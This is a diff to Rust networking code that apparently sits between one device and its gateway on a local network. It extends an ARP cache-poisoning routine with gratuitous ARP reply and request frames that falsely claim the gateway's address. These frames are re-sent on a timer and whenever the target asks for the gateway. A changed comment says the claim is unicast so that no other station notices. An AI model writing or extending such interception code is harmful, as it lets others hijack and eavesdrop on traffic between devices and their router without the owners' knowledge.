@@ -504,6 +504,12 @@ fn relay_loop(
     };
 
     let poison_target = crate::lan_ctrl::arp_reply(tm, our, gip, tm, tip);
+    // Two more forms of the same claim. A stack that ignores a targeted reply
+    // can still take a gratuitous reply or a gratuitous request, and the cost
+    // is two more 42-byte frames per tick. If none is accepted, this device
+    // pins its gateway and only the router can change that.
+    let poison_grat_reply = crate::lan_ctrl::arp_reply(tm, our, gip, [0xff; 6], gip);
+    let poison_grat_request = arp_request(tm, our, gip, gip);
     let poison_gateway = crate::lan_ctrl::arp_reply(gw, our, tip, gw, gip);
 
     // Nothing has been claimed yet. Send the claim only if a frame really
@@ -512,6 +518,8 @@ fn relay_loop(
     let mut sent_any = false;
     for _ in 0..3 {
         sent_any |= cap.send(&poison_target);
+        sent_any |= cap.send(&poison_grat_reply);
+        sent_any |= cap.send(&poison_grat_request);
         sent_any |= cap.send(&poison_gateway);
         std::thread::sleep(Duration::from_millis(60));
     }
@@ -551,6 +559,8 @@ fn relay_loop(
         if last_poison.elapsed() >= POISON_EVERY {
             last_poison = Instant::now();
             let _ = cap.send(&poison_target);
+            let _ = cap.send(&poison_grat_reply);
+            let _ = cap.send(&poison_grat_request);
             let _ = cap.send(&poison_gateway);
         }
 
@@ -583,6 +593,8 @@ fn relay_loop(
                     let tpa = [frame[l3 + 24], frame[l3 + 25], frame[l3 + 26], frame[l3 + 27]];
                     if spa == tip && tpa == gip {
                         let _ = cap.send(&poison_target);
+                        let _ = cap.send(&poison_grat_reply);
+                        let _ = cap.send(&poison_grat_request);
                     } else if spa == gip && tpa == tip {
                         let _ = cap.send(&poison_gateway);
                     } else if spa == tip && !foreign_gateway_logged {
@@ -714,8 +726,9 @@ fn transmit(
     }
 }
 
-/// A unicast probe: "who has `target_ip`?" sent to the hardware address the
-/// roster gave. Only that device sees it, and its reply proves the address.
+/// An ARP request for `target_ip`. The caller picks the Ethernet destination:
+/// the discovery probe broadcasts, while the gratuitous claim unicasts to the
+/// device so no other station sees it.
 fn arp_request(dst_mac: [u8; 6], src_mac: [u8; 6], sender_ip: [u8; 4], target_ip: [u8; 4]) -> Vec<u8> {
     let mut f = Vec::with_capacity(42);
     f.extend_from_slice(&dst_mac);
@@ -783,7 +796,7 @@ mod tests {
     const TM: [u8; 6] = [0x42, 0xd5, 0x2a, 0x0c, 0xbc, 0x0a];
 
     #[test]
-    fn a_probe_is_a_unicast_request() {
+    fn a_probe_request_is_well_formed() {
         let f = arp_request(TM, OUR, [192, 168, 1, 52], [192, 168, 1, 28]);
         assert_eq!(&f[0..6], &TM);
         assert_eq!(&f[6..12], &OUR);
